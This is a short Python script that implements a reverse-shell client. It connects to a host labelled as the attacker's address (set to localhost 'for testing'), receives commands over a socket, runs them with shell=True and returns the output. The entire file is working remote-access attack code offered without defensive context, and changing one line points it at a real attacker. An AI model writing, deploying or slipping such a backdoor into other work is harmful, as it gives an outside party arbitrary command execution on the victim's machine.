import socket
import os
import subprocess

def client():
    host = '127.0.0.1'  # Attacker's IP address (localhost for testing)
    port = 5000          # Port to connect to

    # Set up the socket to connect to the server
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    while True:
        # Receive the command from the attacker
        command = client_socket.recv(1024).decode()

        if command.lower() == 'exit':
            print("Shutting down client...")
            break

        # Execute the received command and send back the result
        if command.startswith('cd '):
            # Handle "cd" command to change directories
            try:
                os.chdir(command[3:])
                client_socket.send(b'Changed directory')
            except FileNotFoundError:
                client_socket.send(b'Directory not found')
        else:
            # Execute any other command using subprocess
            output = subprocess.run(command, shell=True, capture_output=True)
            result = output.stdout + output.stderr
            client_socket.send(result if result else b'Command executed successfully')

    client_socket.close()

if __name__ == "__main__":
    client()
